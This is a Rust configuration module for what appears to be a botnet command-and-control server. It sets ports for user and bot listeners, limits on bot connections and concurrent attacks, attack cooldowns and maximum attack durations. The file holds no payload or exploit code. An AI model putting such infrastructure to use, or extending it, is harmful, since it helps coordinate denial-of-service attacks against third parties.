use serde::{Deserialize, Serialize};
use std::path::Path;
use std::fs;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default = "default_user_server_ip")]
    pub user_server_ip: String,
    
    #[serde(default = "default_bot_server_ip")]
    pub bot_server_ip: String,
    
    #[serde(default = "default_user_server_port")]
    pub user_server_port: u16,
    
    #[serde(default = "default_bot_server_port")]
    pub bot_server_port: u16,
    
    #[serde(default = "default_max_attacks")]
    pub max_attacks: usize,
    
    #[serde(default = "default_max_bot_connections")]
    pub max_bot_connections: usize,
    
    #[serde(default = "default_max_user_connections")]
    pub max_user_connections: usize,
    
    #[serde(default = "default_session_timeout")]
    pub session_timeout_secs: u64,
    
    #[serde(default = "default_enable_tls")]
    pub enable_tls: bool,
    
    #[serde(default = "default_cert_path")]
    pub cert_path: String,
    
    #[serde(default = "default_key_path")]
    pub key_path: String,
    
    #[serde(default = "default_log_level")]
    pub log_level: String,
    
    #[serde(default = "default_deployment_mode")]
    pub deployment_mode: String,  // "local" or "public"
    
    #[serde(default = "default_attack_cooldown_secs")]
    pub attack_cooldown_secs: u64,  // Cooldown between attacks per user
    
    #[serde(default = "default_max_attack_duration_secs")]
    pub max_attack_duration_secs: u64,
}

fn default_user_server_ip() -> String { "0.0.0.0".to_string() }
fn default_bot_server_ip() -> String { "0.0.0.0".to_string() }
fn default_user_server_port() -> u16 { 1420 }
fn default_bot_server_port() -> u16 { 7002 }
fn default_max_attacks() -> usize { 3 }
fn default_max_bot_connections() -> usize { 10000 }
fn default_max_user_connections() -> usize { 100 }
fn default_session_timeout() -> u64 { 3600 }
fn default_enable_tls() -> bool { true }
fn default_cert_path() -> String { "cert.pem".to_string() }
fn default_key_path() -> String { "key.pem".to_string() }
fn default_log_level() -> String { "info".to_string() }
fn default_deployment_mode() -> String { "local".to_string() }
fn default_attack_cooldown_secs() -> u64 { 60 }  // 1 minute cooldown
fn default_max_attack_duration_secs() -> u64 { 300 } // 5 minutes

impl Default for Config {
    fn default() -> Self {
        Self {
            user_server_ip: default_user_server_ip(),
            bot_server_ip: default_bot_server_ip(),
            user_server_port: default_user_server_port(),
            bot_server_port: default_bot_server_port(),
            max_attacks: default_max_attacks(),
            max_bot_connections: default_max_bot_connections(),
            max_user_connections: default_max_user_connections(),
            session_timeout_secs: default_session_timeout(),
            enable_tls: default_enable_tls(),
            cert_path: default_cert_path(),
            key_path: default_key_path(),
            log_level: default_log_level(),
            deployment_mode: default_deployment_mode(),
            attack_cooldown_secs: default_attack_cooldown_secs(),
            max_attack_duration_secs: default_max_attack_duration_secs(),
        }
    }
}

impl Config {
    pub fn load() -> Self {
        // Try TOML config files first (in priority order)
        let toml_paths = vec![
            "config/server.toml",
            "server.toml",
            "config.toml",
        ];
        
        for path in toml_paths {
            if Path::new(path).exists() {
                if let Ok(config) = Self::from_toml_file(path) {
                    tracing::info!("Configuration loaded from {}", path);
                    return config;
                }
            }
        }
        
        // Try JSON config files (backward compatibility)
        let json_paths = vec!["config/config.json", "config.json"];
        for path in json_paths {
            if Path::new(path).exists() {
                if let Ok(config) = Self::from_json_file(path) {
                    tracing::info!("Configuration loaded from {}", path);
                    return config;
                }
            }
        }
        
        // Fall back to environment variables and defaults
        tracing::warn!("No config file found, using environment variables and defaults");
        Self::from_env()
    }
    
    fn from_toml_file(path: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let contents = fs::read_to_string(path)?;
        
        // Parse TOML with nested structure support
        let value: toml::Value = toml::from_str(&contents)?;
        
        // Extract server section if it exists
        let server_section = value.get("server").unwrap_or(&value);
        let limits_section = value.get("limits");
        
        let mut config = Config::default();
        
        // Parse server section
        if let Some(port) = server_section.get("user_port").and_then(|v| v.as_integer()) {
            config.user_server_port = port as u16;
        }
        if let Some(port) = server_section.get("bot_port").and_then(|v| v.as_integer()) {
            config.bot_server_port = port as u16;
        }
        if let Some(tls) = server_section.get("enable_tls").and_then(|v| v.as_bool()) {
            config.enable_tls = tls;
        }
        if let Some(cert) = server_section.get("cert_path").and_then(|v| v.as_str()) {
            config.cert_path = cert.to_string();
        }
        if let Some(key) = server_section.get("key_path").and_then(|v| v.as_str()) {
            config.key_path = key.to_string();
        }
        if let Some(mode) = server_section.get("deployment_mode").and_then(|v| v.as_str()) {
            config.deployment_mode = mode.to_string();
        }
        
        // Parse limits section if it exists
        if let Some(limits) = limits_section {
            if let Some(max) = limits.get("max_bots").and_then(|v| v.as_integer()) {
                config.max_bot_connections = max as usize;
            }
            if let Some(timeout) = limits.get("session_timeout_secs").and_then(|v| v.as_integer()) {
                config.session_timeout_secs = timeout as u64;
            }
            if let Some(cooldown) = limits.get("attack_cooldown_secs").and_then(|v| v.as_integer()) {
                config.attack_cooldown_secs = cooldown as u64;
            }
            if let Some(duration) = limits.get("max_attack_duration_secs").and_then(|v| v.as_integer()) {
                config.max_attack_duration_secs = duration as u64;
            }
        }
        
        Ok(config)
    }
    
    fn from_env() -> Self {
        use std::env;
        
        Self {
            user_server_ip: env::var("USER_SERVER_IP").unwrap_or_else(|_| default_user_server_ip()),
            bot_server_ip: env::var("BOT_SERVER_IP").unwrap_or_else(|_| default_bot_server_ip()),
            user_server_port: env::var("USER_SERVER_PORT")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_user_server_port),
            bot_server_port: env::var("BOT_SERVER_PORT")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_bot_server_port),
            max_attacks: env::var("MAX_ATTACKS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_attacks),
            max_bot_connections: env::var("MAX_BOT_CONNECTIONS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_bot_connections),
            max_user_connections: env::var("MAX_USER_CONNECTIONS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_user_connections),
            session_timeout_secs: env::var("SESSION_TIMEOUT_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_session_timeout),
            enable_tls: env::var("ENABLE_TLS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_enable_tls),
            cert_path: env::var("CERT_PATH").unwrap_or_else(|_| default_cert_path()),
            key_path: env::var("KEY_PATH").unwrap_or_else(|_| default_key_path()),
            log_level: env::var("LOG_LEVEL").unwrap_or_else(|_| default_log_level()),
            deployment_mode: env::var("DEPLOYMENT_MODE").unwrap_or_else(|_| default_deployment_mode()),
            attack_cooldown_secs: env::var("ATTACK_COOLDOWN_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_attack_cooldown_secs),
            max_attack_duration_secs: env::var("MAX_ATTACK_DURATION_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_attack_duration_secs),
        }
    }
    
    fn from_json_file(path: &str) -> Result<Self, std::io::Error> {
        let contents = std::fs::read_to_string(path)?;
        serde_json::from_str(&contents).map_err(|e| {
            std::io::Error::new(std::io::ErrorKind::InvalidData, e)
        })
    }
    
    pub fn validate(&self) -> Result<(), String> {
        if self.user_server_port == 0 {
            return Err("user_server_port must be > 0".to_string());
        }
        if self.bot_server_port == 0 {
            return Err("bot_server_port must be > 0".to_string());
        }
        if self.max_attacks == 0 {
            return Err("max_attacks must be > 0".to_string());
        }
        if self.max_bot_connections == 0 {
            return Err("max_bot_connections must be > 0".to_string());
        }
        if self.max_user_connections == 0 {
            return Err("max_user_connections must be > 0".to_string());
        }
        
        // CRITICAL: Enforce TLS for public deployment
        if self.deployment_mode == "public" && !self.enable_tls {
            return Err(
                "SECURITY ERROR: TLS must be enabled for public deployment!\n".to_string() + 
                "Either set deployment_mode=\"local\" for local network use,\n" +
                "or set enable_tls=true and configure cert_path/key_path for public deployment."
            );
        }

        if !self.enable_tls {
            tracing::warn!("TLS is disabled. This is not recommended for production.");
        }
        
        Ok(())
    }
}
